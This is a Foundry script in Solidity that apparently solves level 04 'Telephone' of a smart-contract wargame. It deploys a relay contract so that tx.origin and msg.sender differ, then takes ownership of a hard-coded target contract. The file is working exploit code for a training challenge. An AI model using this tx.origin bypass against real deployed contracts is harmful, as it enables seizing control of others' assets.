// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "../src/04_Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITelephone {
    function owner() external returns (address);
    function changeOwner(address _owner) external;
}

// The caller Contract

contract TelephoneCaller {
    function attack(address _target, address _newowner) public {
        ITelephone(_target).changeOwner(_newowner);
    }
}

contract TelephoneAttack is Script {
    address target = 0x9D1ccfE350d438Ce6cbED383b7b00C9Dd874DF33;

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(privateKey);

        vm.startBroadcast(privateKey);
        ITelephone telephone = ITelephone(target);

        console.log("Owner before: ", telephone.owner());

        TelephoneCaller caller = new TelephoneCaller();

        caller.attack(target, attacker);

        console.log("Owner after: ", telephone.owner());
        vm.stopBroadcast();
    }
}

